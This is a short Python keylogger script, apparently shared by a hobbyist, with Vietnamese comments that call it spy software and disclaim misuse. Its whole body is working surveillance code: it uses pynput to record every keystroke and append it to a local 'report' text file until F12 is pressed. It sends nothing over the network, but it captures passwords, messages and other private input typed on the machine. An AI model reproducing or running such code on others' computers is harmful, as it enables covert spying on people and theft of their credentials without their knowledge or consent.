# Copyright by NGUYEN NHU HAI DANG (Kachion) không được phép tự ý chỉnh sửa nến không có sự cố
#chúng tôi sẽ không chịu tránh nhiệm cho bạn sử dụng con dán điệp này với không đúng mục đích
# Xin chân thành cảm ơn
from pynput.keyboard import Listener
 
def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = "\n"
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.tab":
        key = "\n"
        
    with open("báo cáo.txt", "a") as file:
        file.write(key)
    print(key)

with Listener(on_press=anonymous) as hackernhudang:
    hackernhudang.join()
